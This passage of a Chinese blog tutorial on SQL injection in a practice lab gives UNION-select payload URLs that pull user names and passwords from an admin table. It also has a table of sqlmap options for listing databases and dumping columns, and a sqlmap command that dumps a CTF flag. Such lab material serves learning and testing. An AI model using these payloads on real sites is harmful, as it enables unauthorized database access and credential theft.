<pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(id,user,pwd),3 from admin
</code></pre><p>方法二:</p>
<p>查询sqltest表:</p>
<pre><code>http://localhost/sqls/index.php?id=2 union select null,title,content from sqltest
</code></pre><p>查询admin表:</p>
<pre><code>http://localhost/sqls/index.php?id=2 union select id,user,pwd from admin
</code></pre><p>方法三:</p>
<p>查询admin表:</p>
<pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,2,concat(user,0x3c,pwd) from admin
</code></pre></li>
</ul>
<h4 id="sqlmap">sqlmap</h4>
<blockquote>
<p>工具：sqlmap</p>
<p>靶场：https://rimovni.exeye.run/hugkudure/well</p>
<p><!-- raw HTML omitted --></p>
</blockquote>
<p>sqlmap注入常见用法：</p>
<table>
<thead>
<tr>
<th>检查注入点</th>
<th>sqlmap -u &ldquo;<a href="http://ooxx.com/a.php?id=1%22">http://ooxx.com/a.php?id=1&quot;</a></th>
</tr>
</thead>
<tbody>
<tr>
<td>列数据库信息</td>
<td>sqlmap -u &ldquo;<a href="http://ooxx.com/a.php?id=1%22">http://ooxx.com/a.php?id=1&quot;</a> &ndash;dbs</td>
</tr>
<tr>
<td>指定数据库名列出所有表</td>
<td>sqlmap -u &ldquo;<a href="http://ooxx.com/a.php?id=1%22">http://ooxx.com/a.php?id=1&quot;</a> -D dbsname &ndash;tables</td>
</tr>
<tr>
<td>指定数据库名表名列出所有字段</td>
<td>sqlmap -u &ldquo;<a href="http://ooxx.com/a.php?id=1%22">http://ooxx.com/a.php?id=1&quot;</a> -D dbsname -T tablename &ndash;columns</td>
</tr>
<tr>
<td>定数据库名表名字段dump出指定字段</td>
<td>sqlmap -u &ldquo;<a href="http://ooxx.com/a.php?id=1%22">http://ooxx.com/a.php?id=1&quot;</a> -D dbsname -T tablename -C columnname &ndash;dump</td>
</tr>
<tr>
<td>cookie 注入</td>
<td>&ndash;cookie=COOKIE 在需要登录的地方，需要登录后的cookie</td>
</tr>
<tr>
<td>执行指定的 SQL 语句</td>
<td>&ndash;sql-query=QUERY</td>
</tr>
<tr>
<td>代理注入</td>
<td>&ndash;proxy=&ldquo;http://127.0.0.1:8087&rdquo;</td>
</tr>
</tbody>
</table>
<h4 id="命令">命令</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">python sqlmap.py -u <span style="color:#e6db74">&#34;https://rimovni.exeye.run/hugkudure/well&#34;</span> --form --batch -D twosecu1_vuln_06 -T flag -C flag --dump
</code></pre></div><blockquote>
<p>&ndash;form   :表单</p>
<p>&ndash;batch  :跳过选择</p>
</blockquote>
<p>开始注入，获得数据库</p>
<p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1617674097343.png" alt="1617674097343"></p>
</article>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </main>
</div>

  <div class="footer container-xl width-full p-responsive">
  <div
    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="https://kayleh.top">
      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
        <path fill-rule="evenodd"
          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
        </path>
      </svg>
    </a>
    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
      
      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
      
    </ul>
  </div>
  <div class="d-flex flex-justify-center pb-6">
    <span class="f6 text-gray-light"></span>
  </div>


</div>
</body>

<script type="application/javascript" src="https://kayleh.top/js/github-style.js"></script>



</html>